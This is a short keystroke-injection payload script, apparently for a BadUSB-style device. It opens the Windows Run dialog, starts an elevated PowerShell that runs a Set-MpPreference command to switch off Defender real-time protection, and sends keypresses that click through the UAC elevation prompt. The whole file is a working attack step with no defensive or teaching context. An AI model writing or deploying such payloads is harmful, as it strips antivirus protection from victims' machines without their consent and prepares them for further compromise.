layout('us');
press("GUI r");
delay(2000);
type("powershell start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs\n")
delay(2000);
press("ENTER");
delay(2000);
press("SHIFT TAB");
delay(2000);
press("ENTER");
delay(2000);
press("ALT y");
